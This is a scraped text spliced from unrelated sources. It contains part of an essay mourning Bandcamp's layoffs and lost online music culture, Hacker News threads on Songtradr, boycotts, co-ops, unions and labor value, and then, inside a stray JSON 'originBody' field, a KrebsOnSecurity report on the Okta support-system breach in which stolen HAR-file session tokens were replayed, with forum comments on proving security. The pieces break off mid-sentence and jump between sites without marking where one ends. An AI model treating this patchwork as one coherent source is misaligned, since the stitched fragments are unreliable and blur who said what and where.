read about music and culture — The AV Club, Gawker, Noisey— existed as hollowed out versions of themselves to different degrees long after they became depressing to look at. Whether it comes down to an SEO click farm, a shell of former infamy without understanding what made it successful, or a slow fade out of anything published at all— they all end up looking the same. They’re graveyards of broken and unreadable articles that changed my life. Just like all those websites, MySpace was a zombie of itself for a long time before the nails were finally put in the coffin. We know the end of the MySpace saga. Now it’s nothing but a memory of a seemingly better version of the intersection of music and the internet. It’s easy to believe that in 15 years someone will be writing a book mourning the heyday of Bandcamp when it had the power to make real careers and real scenes. The companies that buy up sites like Bandcamp are interested in nothing except ensuring the executives’ pockets get lined appropriately. Growth is the only thing of interest. It’s the story of capitalism, but here, like with MySpace, it becomes a matter of cultural preservation. They can – and will – ruin everything you love and wipe it from existence. MySpace lost 13 years of music, photos, and videos. We can talk about what was going on on MySpace and interview people who were there, but the data being erased remains an unimaginable culture loss. It’s difficult to even know what has been lost due to the sheer incompetence. Right now there are brewing problems over at resale site and database, Discogs, due to increased fees as a result of a push for growth and in exchange for very little in terms of functionality. The data Discogs has – just like Bandcamp and just like what has been lost at MySpace – is irreplaceable and ever growing. So to have years of culture on Twitter – everything from the continued existence of legacy accounts to the basic usefulness of news organizations being verified – been ravaged by Elon Musk’s vanity. The internet is forever, until it’s ripped away by people who don’t add value to it. Bandcamp isn’t gone, and maybe it won’t really deteriorate or go away, but it feels as though everybody has come to the conclusion that no website is acting in your best interest – no matter the reputation. No parent company willing to slash half a staff cares about your music community, even if purchasing items through their web stores is still more beneficial to an artist than pulling it up on Spotify. The writing is on the wall, and it has caused a mourning in the broader music community of what Bandcamp represents. Or we thought it represented. It’s hard, right now, to imagine something that could be able to take Bandcamp’s place because it’s hard to imagine something that will be as usable and as convenient without the money vultures picking it clean. Maybe something will come along – the nature of the internet is that things will be cycled out when something new arrives – but, as of now, I think we may have to just move away from the idea that a convenient service is also going to be a stable, long term home for community. In Aaron Cometbus’s 2019 book Post-Mortem, the question “what’s left if Gilman Street closes?” is raised. The answer given is easy. The people are left. The loss of the place will be felt, but the people will still be there. Music community in Chicago persists without the Fireside Bowl. Music community in Boston persists without Great Scott. Music community in Philly persists without Everybody Hits. Music culture persists in spite of the corporate overlords who make it harder because it has to. Music community online will persist without Bandcamp or Twitter or Tumblr or MySpace or whatever comes next, but we can’t let it be wiped away completely. In the meantime download your music libraries and the PDFs of articles you’ve written if you’re a writer. Make your own web stores to sell you art. Pay the people you believe in to write about music. Nobody will preserve the culture you care about for you. Nobody can make it better but us. Miranda Reinert is a writer, podcaster and zine maker based in Chicago.

How it&#x27;s a great site, how I love buying music there instead of streaming.But what I never did? Read their blog or used any of their social features. So as long as Songtrader keeps paying artists, and keeps offering downloads while letting me stream the music for free until I can decide if I want to buy it or not, I&#x27;ll be fine with them. reply SleepilyLimping 15 hours agoparentI think that journalists (or well, \"company-owned content teams\") are very quick to overestimate the spirituality and necessity of their work.They might think that their work is necessary and invaluable, but it doesn&#x27;t mean that the company or their users will. Like you&#x27;re saying, I have a hard time caring about Bandcamp losing full-time writers when they weren&#x27;t the main attraction at all. reply Hoasi 14 hours agorootparentThe jury is still out on that. Bandcamp&#x27;s branding effort is hard to measure.Even if we didn&#x27;t read their blog posts or listen to their radio podcasts, there is something beautiful in that effort. And I agree that written critique doesn&#x27;t do much for music or art, for that matter.Even though you can&#x27;t quantify it, I wouldn&#x27;t dismiss Bandcamp branding effort around music. You can&#x27;t strip music of everything aside from sounds. Bandcamp&#x27;s rich illustrations managed to set a musical mood, for example.Image is important. Controversies, interviews, politics, and even ridiculousness are part of the culture regardless of whether one decides to engage. reply erickhill 14 hours agoparentprev100%. I&#x27;ve been buying music on Bandcamp regularly for a decade. It&#x27;s where I discovered and became addicted to the synthwave scene. Frankly, there was no other place I could easily discover this kind of niche music over the years and support it the way I could on Bandcamp. I&#x27;m also an Album Guy (dinosaur, I know).But I never cared about or wanted anything other than 1) my music I bought and 2) their not great but good enough search. That&#x27;s it!I&#x27;ve worked for publishers most of my career, so I know what half those employees are going through is painful. It has happened to me before, too. But as a customer of the site, I was completely and blissfully oblivious to any editorial staff.My process: Load bandcamp.com Immediately click on the Heart icon, where all my purchases live. Listen.This was true on the app, too. I found their homepage utterly useless. None of the artists I&#x27;m into ever appeared there. Not cool enough, I&#x27;m sure.Long live bandcamp. reply rob74 14 hours agoparentprevIt&#x27;s a bit hard for me to give Songtradr the benefit of the doubt when they start off by kicking out half of the employees, including, by some very weird coincidence, the whole union bargaining team. Kind of supports the argument of the article that all they care about is maximizing profit, which doesn&#x27;t bode well for artists or users, even if they&#x27;re not (yet) affected... reply dmansen 14 hours agoparentprev> So as long as Songtrader keeps paying artistsFair enough, but I wouldn&#x27;t hold my breath! reply croes 14 hours agoparentprevRegardless of how they treat their employees? reply unfamiliar 14 hours agorootparentYes. That’s a problem to sort out between the employees and the company, it has nothing do to with users or customers. As a user I’m not going to pretend I know any of the relevant context to engage in activism on behalf of anyone. reply croes 14 hours agorootparentSo if a company uses slave workers, child labor, sweatshops it&#x27;s non of the customers business?Isn&#x27;t it part of the market mechanisms that customers punish bad behavior? reply Modified3019 13 hours agorootparentMarket mechanisms have proven completely unreliable at stopping such things, given how few actually give a damn about nestle’s long time child labor and slavery problem. reply zo1 3 hours agorootparentIt&#x27;s odd how we blame the market mechanism but not the people that \"don&#x27;t give a damn\".Ironically, it&#x27;s almost as if you (the person complaining about the market mechanism) don&#x27;t want to boycot those people that don&#x27;t give a damn. It&#x27;s inconvenient isn&#x27;t it? Imagine having to shun your friend, kick out your tenant or fire your employee because they wore a slave-labour Nike shoe. It&#x27;s much easier to blame a market mechanism. reply Draiken 37 minutes agorootparentWe can only control ourselves and alas, we are the minority. So blaming everyone else is pointless.Blaming a system that we can regulate and allows companies to get away with shady practices sounds way more reasonable to me. reply Semaphor 12 hours agorootparentprevIs there a company more boycotted than Nestlé? I know I haven&#x27;t bought anything from them for many years. reply joveian 11 hours agorootparentMaybe not (by some measures at least) but that is the point. They are still the largest food company in the world and one of the largest companies of any kind. Are you sure you aren&#x27;t buying anything from them? They have a large number of brands and are always buying more. You can&#x27;t always tell by looking at the package. Not that long ago a website error that mentioned Nestlé tipped me off that a supplement brand I was considering was owned by them and it turns out they now own several very popular supplement brands. I still think it is important to do your best to avoid such companies but it seems not enough people do this to have much effect even in the worst cases. reply Semaphor 10 hours agorootparentReasonably sure, yeah. Not only am I somewhat sure that you can indeed always tell by the packaging (at least here in Germany), I also check the list of companies every 6 to 12 months.And yeah, the most boycotted company (assuming it is true) means there is barely any effect. People don&#x27;t boycott, many people don&#x27;t even care enough to talk, far fewer want to walk. reply joveian 8 hours agorootparentI&#x27;m glad it is easier to tell there. In the US there are no such requirements :(. I&#x27;ve noticed looking at web sites of various companies that there seems to be some basic disclosure requirements in some EU countries that are helpful (like a contact address, which many companies don&#x27;t have on their website in most of the world). replybroken-kebab 13 hours agorootparentprevDo you claim songtradr uses slave, or child labor? reply croes 13 hours agorootparentI just turned up my example to make my point.If we don&#x27;t care about the employees, who does?If we care only under certain circumstances, where is the limit?Union busting, unpaid overtime, forced labor? reply broken-kebab 13 hours agorootparentThe issue has its context, and producing outrage out of thin air to shame a commenter into submission ain&#x27;t helping you to make any point, really. It&#x27;s a well-known fallacy which you are invoking reply croes 11 hours agorootparentWhat fallacy?The customer either has responsibility or he hasn&#x27;t.And if somebody feels ashamed because they realize they can&#x27;t ignore how a product or service they use is made, proves my point.If they say they deny responsibility, then I can give severe examples to ask: Are you sure? replyJohnFen 11 hours agorootparentprevI love Bandcamp a lot, and as long as they continue to provide great service and treat everybody well, I&#x27;ll absolutely continue to spend money with them.And \"everybody\" does include their employees. If a company doesn&#x27;t treat their employees decently, they aren&#x27;t a good company and I will avoid doing business with them. reply Podgajski 14 hours agorootparentprevWhy are you letting your compassion get in the way of your pleasure? reply icandoit 14 hours agorootparentPeople are social animals.Besides, wireheading will soon be possible. Best to re-evaluate your pleasure from time-to-time, while you can. reply o11c 13 hours agorootparentprevThe \"right to have a non-productive job\" does not and should not exist, even if employees get upset. reply digging 13 hours agorootparentIt&#x27;s not a right, it&#x27;s mandatory for many. reply pera 14 hours agoparentprevThe blog was truly fantastic, discovered several great bands and a few obscure genres. I didn&#x27;t use the social feature either but my guess is that it was good for the musicians. reply theandrewbailey 15 hours agoparentprevSame. I always find music somewhere else like Youtube or Soundcloud, and find the link to Bandcamp from there. reply Pxtl 14 hours agoparentprevOkay but this layoff process didn&#x27;t look like a strategic move where they cut the excess services from bandcamp. It sounds like it was an across-the-board 50% slash. Half the blog staff is still around. reply zanellato19 15 hours agoparentprev\"They are not ruining for me _specifically_ so this article is moot\" is not a great point reply Semaphor 14 hours agorootparentI didn&#x27;t say the article is moot. What I wanted to offer was a counterpoint because in the last few days ago I&#x27;ve been reading is how they are killing everything that made BC BC. And it&#x27;s simply not like that for all of us. reply fzeroracer 14 hours agorootparentYour comment is also bog standard every time there&#x27;s a service or something being cut down. Like the same with Twitter when they removed headlines, I saw people saying &#x27;well I never read headlines in the first place so it didn&#x27;t matter&#x27;.It&#x27;s a semi-smug affirmation that you don&#x27;t care which, great. There&#x27;s others that do, especially when the trajectory for changes like these is for a platform to get worse, not better. reply mardifoufs 13 hours agorootparentI&#x27;d agree but this article, so the subject of this whole thread, is trying to argue that you should care and that this is important. Isn&#x27;t it fair for the comments to discuss why they disagree with that?I agree that it&#x27;s a pattern that happens a lot on unrelated threads, and it sucks, but this one in particular is an exception since the entire OP is about trying to make us care. reply fzeroracer 13 hours agorootparentSee, you&#x27;re taking the wrong message from the article entirely, and I suspect so was the OP.The point of the article isn&#x27;t to make you care about Bandcamp in particular, though it&#x27;s clear the author does. It&#x27;s to point out the fact that if there is something you DO care about, how acquisitions and corporate plays can and will destroy it. You could replace Bandcamp with Steam, or HN or any other entity. That&#x27;s the point. Not the particulars of Bandcamp itself.People here get so lost in the weeds and don&#x27;t actually read what the message of the article is. reply mardifoufs 12 hours agorootparentActually yeah on second thoughts you are right. I don&#x27;t agree with the article at all but I see how the comment you replied to was pretty myopic in this context replyyamazakiwi 14 hours agorootparentprevThe poster&#x27;s intention is to fish for people that feel similarly and drive discussion, not flex that they are unaffected. reply zanellato19 14 hours agorootparentThat wasn&#x27;t at all what I gathered from the comment. reply yamazakiwi 14 hours agorootparentThat is unfortunate reply peruvian 15 hours agorootparentprevClassic HN comment though - adds nothing to the discussion outside of \"I want to smugly have my thoughts out there\". Of course, upvoted to the top. reply officeplant 14 hours agorootparentIt&#x27;s more realistic than smug. I run a small net-label on bandcamp and don&#x27;t really care about the culture of Bandcamp outside of it being a platform we can easily slap albums on and share through other channels. I just need the site to work and exist while passing us our percentage for any sales that come through.Bandcamp has lasted because they haven&#x27;t let the place go to shit like their competition and they&#x27;ve been reliable enough to stay online consistently.I don&#x27;t need social tie ins, and I don&#x27;t want to message my listener base about anything. The spam emails I get from labels trying to be social go directly into the trash and usually make me unfollow them (or disable notifications) reply kagakuninja 14 hours agorootparentprevIt actually echoes my feelings as both a musician and consumer. Just give me the music, I&#x27;ll find it on my own through other channels.To put it another way, there are plenty of ways to find music, what underground musicians need is a an easy to use tool to put their music online, as we are not big enough for Spotify. reply yamazakiwi 14 hours agorootparentprevIt&#x27;s not weird to share opinions on a forum, I don&#x27;t read any smugness in their tone. reply permo-w 14 hours agorootparentsmug is pretty much the baseline on HN reply citruscomputing 14 hours agorootparentI&#x27;m reminded of https:&#x2F;&#x2F;fs.blog&#x2F;david-foster-wallace-this-is-water&#x2F; (both for the initial reference, and for what the text actually says) reply Semaphor 14 hours agorootparentprevI wanted to highlight what actually is worthwhile about BC for what I assume are still quite a few people. But you are right, your comment really improved the discussion. reply mlsu 14 hours agoprev\"Goodwill\" is fungible only in one direction. Goodwill turns into money but money never ever turn into goodwill.(Can you think of an counterexample? A small, beloved indie business that was bought out by a megacorp and had consumers love it more because it had more money?)So, it&#x27;s like entropy. The latch only moves in one direction. Given a consumer beloved business, the only possible thing that can happen is that its goodwill is turned, quickly or slowly, into money. This is actually ok. Every beautiful living thing will eventually die. It&#x27;s simply a fact of life. Cherish the good things while you can, because entropy will always win. reply compiler-guy 14 hours agoparentThe relationship may not be direct, but I don’t think it is nonexsistent.Bandcamp didn’t build goodwill without spending money. In fact, it gained goodwill precisely because it spent its money in ways consistent with building goodwill. reply rondini 14 hours agoparentprevOur current economic system is not some immutable law of nature, we can change it if it&#x27;s harmful to our society reply marssaxman 13 hours agorootparentThat is true to the extent that \"we\" refers to the wealthy and powerful. reply kouru225 14 hours agoparentprevMoney turns into goodwill all the time… just not usually in terms of company buyouts. reply slg 14 hours agoparentprevIt is more than that. It seems like the capitalists are shifting to the mindset that goodwill provides no actual benefit for a business so might as well cash in immediately. Now there is a belief that whenever a customer or business partner leaves an interaction with you with any surplus value, that is an indication that you left money on the table. Happy employees are paid too much. Happy suppliers aren&#x27;t being squeezed hard enough on pricing. Happy customers mean you missed an opportunity to extract more revenue.

My life is way, way better now than it was prior to the internet, Google and half a dozen other services.Even HN&#x27;s favourite boogieman Facebook provided me with insane value. For example:- While I lived abroad, it provided an easy, passive way for me to keep in touch with my family. Compare that to my parents&#x27; desperate 10 dollars per minute phone calls in the 1980s- I met friends through Facebook advertising for a boardgaming group (that I also ran on Facebook.) I met people from way, way more backgrounds than otherwise possible- I can passively keep in touch with friends and easily get in touch if I&#x27;m in the same area.People \"struggle\" to find \"long term value\" because that&#x27;s ironically the meta for upvotes on the contrarian SV Internet right now and we internalize those values far too easily.

Epic changes policies to get the most explosive expansion whenever possible, only for things to collapse because the actual users are the support structure. Epic forces exclusives, Epic very heavily try to stop games from storing data locally, Epic can revoke your purchase at any point, Epic can ban you from EGS and thus all access to your games thanks to their DRM, and Epic has no rules other than \"no porn\" leading to a flood of shovelware, asset flips, and NFT&#x2F;crypto scams.And the thing is, Epic are following industry norms for this. All digital storefronts are trying to enforce the same sorts of policies. Get as much \"stuff\" in front of as many people as possible and have them fork over money to rent that \"stuff\" with tenuous if any protections for their purchase. Valve really are the outliers in this, and the only others I can think of that do what they do are Itch.io and Bandcamp, one a tiny player catering to a lower market and the other essentially the only survivor in their particular niche.

For example, people in the northeastern US probably know of Cabot Cheddar. This is part of the Agri-Mark co-op, which does something like $1 billion in annual business and employs about 1,000 people.Agri-Mark is a \"producer co-op,\" which means that it&#x27;s owned by dairy farms. There are also very successful \"consumer co-ops,\" as well as \"worker co-ops.\"There are many nice things about co-ops:- They can be economically competitive.- They&#x27;re democratically run. (Larger ones often elect a board and&#x2F;or appoint management.)- They&#x27;re strictly voluntary associations.There are also reasons why you don&#x27;t see more co-operatives:- They don&#x27;t have huge incentives to scale. There are plenty of amazing grocery co-ops, for example, that have one or two excellent stores but no desire to expand.- They raise capital through their members. Details vary, but they tend to scale more like bootstrapped businesses than startups.But a musicians&#x27; producer co-op could absolutely build something like Bandcamp. It would be a lot of work, and it would require some genuine organizational talent.A lot of the big open source foundations (the Linux Foundation, the Apache Foundation, etc) are essentially producer co-ops for open source software, even if that&#x27;s not what the paperwork says.I think we should absolutely build more co-ops, for things that really matter. reply dionidium 15 hours agoparentprevOf course anybody can start a co-op and nobody will object.

The alternative is all that value gets captured by C-suite or investors, with decreased mobility of the people doing the work into the class of investors.Unions also have a side effect of creating a selection pressure against exploitation of your workforce to attain profitability.

If you couldn&#x27;t even keep up with Federal minimum wage, that reflected poorly on you as a business operator.>the mention of which in this context is a non sequitur.The mention thereof is far from a non-sequitur. Given that there is no dearth of evidence that the fact that places like Walmart and McD&#x27;s have worker populations disproportionately represented in State Benefit&#x27;s programs, up to and including HR supplied documentation on how to on ramp to said programs; that a preponderance of the evidence at least suggests at some level this is reflected in some aspect in the grand corporate calculus of \"How do I get the most for the least?\" When it becomes a part of your Corporate Strategy, we have issues.Outsourcing your workers living expenses to the American taxpayer is not acceptable.Deliberately paying people a wage so low, then handing them a \"how-to\" guide for food stamps is deliberately tilting your extraction of labor far more in your favor than the worker&#x27;s, because you&#x27;re turning around and telling the worker \"Don&#x27;t forget to file forthis month in your off time!\" After all, I&#x27;m sure employees were not encouraged to engage in this activity on the clock.So you&#x27;re absolutely right. I come from different priors. You should have your shit straight enough as an employer to keep your employees contributing to, instead of being doled out to from, the tax rolls.If you cannot do this, you should be strongly disincentivized from doing up to and including paying extra corporate tax to recover the costs of the people you&#x27;re stiffing.Back to the original topic at hand. How does a Union try to \"take over\" a company? A Union can&#x27;t by definition, because at that point, the company would be a co-op. The Union is fundamentally limited to acting as an extraction to divert value delegation in the counter management&#x2F;investor direction. The Union still has no implicit control outside of \"you do what you want, but this group of laborers is not playing ball unless...\" and channeling it down through a handful of savvy, experienced, and one can only hope, good faith represeentatives.In no way shape or form does that line up with your contention that a union \"takes over\" which with it suggests taking possession of the assets and investments that make up the company. reply bdw5204 13 hours agorootparentprev> Without the unions spooking the management drones, you get things like Walmart and McD&#x27;s going and outsourcing what was previously done via payroll to State benefit programs.Part of the blame there lies with the government allowing corporations to offload their labor costs onto it.

How could capital create additional value on top of labour if labour was not involved? reply drdeca 13 hours agorootparentprevValue produced is a function of multiple inputs. One of those inputs might be called \"labor\". Another one of those inputs might be called \"capital\". Perhaps there are also other inputs, but I don&#x27;t want to address them in this comment. We can speak of, \"if the amount of labor is increased by some marginal amount, what is the marginal increase in the value produced\". We can also speak of \"if the amount of capital is increased by some marginal amount, what is the marginal increase in the value produced\".If we fix some baseline combination of quantities of \"labor\" and \"capital\", and compare it to some later combination where both have been increased, there are a number of possible differences to take.There are V(l_0, c_0) , V(l_0 + dl, c_0), V(l_0, c_0 + dc), V(l_0 + dl, c_0 + dc).One could call V(l_0 + dl, c_0) - V(l_0, c_0) \"the contribution from additional labor\", and V(l_0, c_0 + dc) - V(l_0, c_0) \"the contribution from additional capital\", or one might call V(l_0 + dl, c_0 + dc) - V(L_0, c_0 + dc) \"the contribution from additional labor\" and V(l_0 + dl, c_0 + dc) - V(l_0 + dl, c_0) \"the contribution from additional capital\".In a linear approximation, these two ways of assigning quantities to these names for quantities, could be the same. But I wouldn&#x27;t really expect them to be the same in practice, at least for large values of dl and dc. (note: I am using \"dl\" and \"dc\" instead of \\Delta l and \\Delta c, because it is more convenient to type. I don&#x27;t mean to suggest that the changes are extremely small or infinitesimal, as might be suggested by using the letter d instead of \\Delta.)As such, I think that \"the additional value that an additional amount of capital is able to produce\" is a meaningful value if \"quantity of labor\" is held constant, and that \"the additional value that an additional amount of labor is about to produce\" is a meaningful value if \"amount of capital\" is held constant.When both values are changed, then how much to attribute the increase in value produced to, is I think inherently somewhat ambiguous, but also not a completely meaningless question.Given the four values V(l_0, c_0) , V(l_0 + dl, c_0), V(l_0, c_0 + dc), V(l_0 + dl, c_0 + dc), assuming that all four of the differences I mentioned previously are non-negative, then clearly the additional value from either cannot reasonably be said to be more than V(l_0 + dl, c_0 + dc) - V(l_0, c_0). Nor, I think, can the value attributed to the change along one axis, be reasonably estimated as less than the minimum of the differences along that axis. Also, I think probably a more reasonable upper bound on either contribution, is the maximum of the two differences for the respective axis.Now, maybe your goal is to talk about the deserts, rather than causes? But if we are talking about what things are causally responsible for how much of something is produced, I think it&#x27;s pretty clear that this analysis in terms of differences of these 4 terms, is on the right track. reply tehjoker 12 hours agorootparentWhen you use capital to buy machines, they are embodied labor from outside of the organization and the exploitation is shifted from internal to external.The core claim is that simply buying things and managing things produces value all on its own and it&#x27;s transparently false as if the thing wasn&#x27;t produced, you couldn&#x27;t buy it.The other core claim is that there&#x27;s a legitimacy to the idea that if you buy something that is socially useful, you get to derive the exclusive right to the fruits of it which makes no sense. reply dionidium 14 hours agorootparentprevYou’re describing the labor theory of value, which you present as undeniable fact, but which of course is the subject of one of the most salient and contentious debates of the last century. reply metabagel 14 hours agorootparentNo, they are saying that labor generates profit. That’s different than saying that the value of something is the labor value. reply randomdata 10 hours agorootparentExcept, the return on capital input is what generates the profit. Labour extracts the entire return on labour input for itself.Of course it does. Why would labour settle for anything less than every last cent (within some reasonable margin of error) of value that it produces? Labour is highly mobile and holds all the power. Labour is able to produce value even without capital. Capital, on the other hand, doesn&#x27;t function without labour. You are simply not going to keep labour around to maintain capital operation if you don&#x27;t give back all the labour value it produces.In practice, we can also demonstrate that this is the case as even when unions roll into town – which really reenforces how much power labour wields – you never see the needle move more than small percentages that are within the margin of error.

Looking at market values? Lines of code?> it is objective reality.Care to elaborate? business give people jobs, and therefore the business becomes an exploiter? Objectively reply happyraul 13 hours agorootparentTo exploit means to reap some benefit. If there&#x27;s no profit, there&#x27;s no exploitation, I guess. A profitable business is absolutely exploiting its workers, that&#x27;s what exploit means. reply cornel_io 14 hours agorootparentprevI guess it comes down to your definition of \"exploitation\", whether that&#x27;s bad, and whether you consider employment to be a mutually exploitative arrangement (which I could get behind, though I think it&#x27;s not a bad thing).If the employer is paying you more than the value you would generate without being attached to them, then you&#x27;re benefitting from that substantially. If your earning potential would be $1&#x2F;hr on your own, but by joining ABC Corp you are leveraged and can earn them $3&#x2F;hr and be paid $2&#x2F;hr, then is that exploitation? To me that seems like a fair exchange that is mutually beneficial and grows the pie for everyone. And to be clear, ultimately the fact that you can earn more when attached to a business derives from the fact that you are able to wield and command some of the resources that the business is capitalized with, which you otherwise would not have access to.The immediate objection will be that the surplus value is not typically fairly split between the employer and employee; maybe in some cases that&#x27;s true? But from what I&#x27;ve seen, that&#x27;s not as true as it may sound at first. The majority of people are able to earn essentially zero unless they are attached to a Real Job(tm), because most people at least in modern society have absolutely no idea how to optimally generate value on their own: there&#x27;s a reason people get so upset when they&#x27;re laid off or fired, it&#x27;s far from trivial to figure out how to make your own money, it&#x27;s much easier to just find another job. And the margin on labor costs are typically not >50% in most industries, which means that the actual divvying of surplus value is not really that abusive, it&#x27;s a lot closer to the situation I mentioned in the first paragraph than most anti-capitalists would suggest.I&#x27;m sure a lot of people would reject my framing altogether, and argue that it&#x27;s only because we live in a capitalist society that it&#x27;s so hard to get by without joining a company, or they&#x27;d argue that even if my logic holds workers deserve a lot more than an equal split of the surplus value, but I think this at least explains where a lot of us who do think capitalism works are coming from. It&#x27;s not an unconsidered position, even if people disagree with the underlying moral framework. reply tehjoker 10 hours agorootparentI think a problem with what you said is that you are evaluating how much someone can earn in comparison to a race to the bottom with other workers. The proper comparison is how much money the business is making as a whole.One thing to keep in mind is that the US GDP is ~20T, if everyone made an equal amount before taxes, that would be somewhere around 120k (a little more or less as workers are about half the economy).You can see from that comparison that the level of exploitation is far higher than than you supposed. replybuzzert 14 hours agoprevNot to defend Bandcamp in this particular scenario, but I feel there&#x27;s something people often miss when psychoanalyzing why companies behave this way that I think explains quite a lot.Web properties, just like any property even in the physical world, become more expensive to operate in the long term. Very rarely do I hear of companies spending less money to operate something in the future than they did early on. Part of this is scale, as things become more popular, it takes more people to keep it running. Another part of it is macroeconomics, stuff they rely on, particularly labor (landscapers in the physical world or server admins, for instance) can become more expensive due to a number of factors. A lot of people, like the author of this post, assume that once a web property is built, it exists forever (like a statue or monument), but that&#x27;s of course not the case.When a company needs to make decisions to increase their margin, a lot of people attribute it to \"growth,\" and use it almost in a derogatory way. I think a more charitable way to see it is that it&#x27;s not necessarily growth (although I&#x27;m sure that is a factor), but just to even keep the website running, a lot of times the same decisions need to be made (i.e., layoffs, charging for stuff that used to be free, etc).When you think about it this way, it really seems like either these sites make decisions like this to continue to exist, or they cease existing. This seems to track pretty well with a lot of cases I can think of. I think some very ideologically motivated people can work extremely hard to keep operating costs down to avoid this scenario (Craigslist comes to mind), but this is not easy, and it&#x27;s very far from being the \"default\". reply rangerelf 14 hours agoparentThis part is what many have a problem with I think: \"...When a company needs to make decisions to increase their margin...\"; why?

Any hiring or firing decisions from that point on are a part of someone&#x27;s money-making plan that (almost always) ends in another sale (whether private or IPO). Did anyone honestly think Epic was going to be a good custodian?No one has to do that. Songtrader and other giants and all the PE big funds in the world can&#x27;t make someone do that. The world is full of companies that never sell 50% of the shares because they care about what they have built more than cash and would prefer to keep a modestly profitable business going that employs their friends and families and continues to embody their values. Some of these even take outside investment from private equity funds - I&#x27;ve done diligences for them - where the deal is very clearly that less than 50% is ever going to be for sale.

    "originBody": "Advertisement Skip to content HOMEABOUT THE AUTHOR ADVERTISING/SPEAKING Hackers Stole Access Tokens from Okta’s Support Unit October 20, 2023 4 Comments Okta, a company that provides identity tools like multi-factor authentication and single sign-on to thousands of businesses, has suffered a security breach involving a compromise of its customer support unit, KrebsOnSecurity has learned. Okta says the incident affected a “very small number” of customers, however it appears the hackers responsible had access to Okta’s support platform for at least two weeks before the company fully contained the intrusion. In an advisory sent to an undisclosed number of customers on Oct. 19, Okta said it “has identified adversarial activity that leveraged access to a stolen credential to access Okta’s support case management system. The threat actor was able to view files uploaded by certain Okta customers as part of recent support cases.” Okta explained that when it is troubleshooting issues with customers it will often ask for a recording of a Web browser session (a.k.a. an HTTP Archive or HAR file). These are sensitive files because in this case they include the customer’s cookies and session tokens, which intruders can then use to impersonate valid users. “Okta has worked with impacted customers to investigate, and has taken measures to protect our customers, including the revocation of embedded session tokens,” their notice continued. “In general, Okta recommends sanitizing all credentials and cookies/session tokens within a HAR file before sharing it.” The security firm BeyondTrust is among the Okta customers who received Thursday’s alert from Okta. BeyondTrust Chief Technology Officer Marc Maiffret said that alert came more than two weeks after his company alerted Okta to a potential problem. Maiffret emphasized that BeyondTrust caught the attack earlier this month as it was happening, and that none of its own customers were affected. He said that on Oct 2., BeyondTrust’s security team detected that someone was trying to use an Okta account assigned to one of their engineers to create an all-powerful administrator account within their Okta environment. When BeyondTrust reviewed the activity of the employee account that tried to create the new administrative profile, they found that — just 30 minutes prior to the unauthorized activity — one of their support engineers shared with Okta one of these HAR files that contained a valid Okta session token, Maiffret said. “Our admin sent that [HAR file] over at Okta’s request, and 30 minutes after that the attacker started doing session hijacking, tried to replay the browser session and leverage the cookie in that browser recording to act on behalf of that user,” he said. Maiffret said BeyondTrust followed up with Okta on Oct. 3 and said they were fairly confident Okta had suffered an intrusion, and that he reiterated that conclusion in a phone call with Okta on October 11 and again on Oct. 13. In an interview with KrebsOnSecurity, Okta’s Deputy Chief Information Security Officer Charlotte Wylie said Okta initially believed that BeyondTrust’s alert on Oct. 2 was not a result of a breach in its systems. But she said that by Oct. 17, the company had identified and contained the incident — disabling the compromised customer case management account, and invalidating Okta access tokens associated with that account. Wylie declined to say exactly how many customers received alerts of a potential security issue, but characterized it as a “very, very small subset” of its more than 18,000 customers. The disclosure from Okta comes just weeks after casino giants Caesar’s Entertainment and MGM Resorts were hacked. In both cases, the attackers managed to social engineer employees into resetting the multi-factor login requirements for Okta administrator accounts. In March 2022, Okta disclosed a breach from the hacking group LAPSUS$, a criminal hacking group that specialized in social-engineering employees at targeted companies. An after-action report from Okta on that incident found that LAPSUS$ had social engineered its way onto the workstation of a support engineer at Sitel, a third-party outsourcing company that had access to Okta resources. Okta’s Wylie declined to answer questions about how long the intruder may have had access to the company’s case management account, or who might have been responsible for the attack. However, she did say the company believes this is an adversary they have seen before. “This is a known threat actor that we believe has targeted us and Okta-specific customers,” Wylie said. Update, 2:57 p.m. ET: Okta has published a blog post about this incident that includes some “indicators of compromise” that customers can use to see if they were affected. But the company stressed that “all customers who were impacted by this have been notified. If you’re an Okta customer and you have not been contacted with another message or method, there is no impact to your Okta environment or your support tickets.” Update, 3:36 p.m. ET: BeyondTrust has published a blog post about their findings.

Reply → BrianKrebs Post author October 20, 2023 Not sure, but their URL is interesting sec.okta.com Reply → Brad Larkin October 20, 2023 Thinking about all these data breaches that are basically called insubstantial by the compromised entity: there needs to be cash bond put up for two years with a third party for the total number of accounts which might have been compromised. If there is indeed no exploitation or damage in that time, the compromised entity gets the money back. But if the hackers do get customer data, then customer is entitled to a payment from escrow. Rate should be meaningful but not excessive: say $ 5 per UTF character of customer data. That metered approach also encourages the entities to guard / partition data at rest better.

A criminal enterprise can literally hire tens to hundreds of skilled hackers full time for years to target these systems and still turn a profit.The default assumption is that systems are easily hacked. Claiming protection against even small teams of moderately skilled attackers, let alone organized crime, is a extraordinary claim. Where is their extraordinary evidence? reply xyproto 10 hours agorootparentThe only proof of security is the lack of counter-evidence, though.One can prove that a vault has been secure for the N last years, but not that it will be secure for eternity. reply Veserv 9 hours agorootparentSo I can just give you a cardboard box and call it a vault? You can not prove me wrong upfront so you have to believe me? That is ridiculous.There is plenty of evidence you can provide to establish confidence that a certain degree of security has been achieved. Robust auditing, thorough review, formal methods, exhaustive testing, competent red teams exercises failing to find any vulnerabilities, etc. The only people throwing their hands up claiming security can not be evaluated have nothing useful to say about security because they do not even believe it is possible to know if they did anything. reply reactordev 7 hours agorootparentCounter argument. Okta does all those things. Provides all the evidence, the red teams, etc. and still you don’t trust them (because they continue to have breaches) so to argue that one can prove security is false. One can only practice security and find assurance in certainty that they can identify events after or when they occur. No one can predict the future and no one can guarantee security in perpetuity. So I agree with you that Okta sucks. I also agree with the argument that you have to keep the knife sharp but you can’t just state the knife is sharp. You have to draw some blood to prove it. Likewise security postures are tested when incidents occur, through testing oneself or from another testing you. Complacency in this is when holes form. Security can only be evaluated at the moment in time. You can audit the past, but you can’t audit the future. reply Veserv 6 hours agorootparentCounter argument, prove that Okta does any of those things to any meaningful degree. They are responsible for guarding the authentication to literally billions of dollars of assets. They are a prime target for organized crime who can field teams of tens to hundreds of hackers and state actors who can field teams of thousands for years. The recent Ceasar&#x27;s attack had a 15 M$ payout, which means it would have been profitable to spend 5-10 M$ of hacking resources to pull off that attack. Okta is a much juicier target. They need to have security adequate to defeat a attack with 10 M$ of funding at a bare minimum.So yeah, show me a red team exercise with 10 M$ of funding, they get a 30 person hacking team and 1 year fulltime, that failed to find any vulnerabilities and failed to gain access to any sensitive data, then we can talk about if they provided evidence of adequate security. I bet all they have is what everybody else has which is red team exercises that had 3 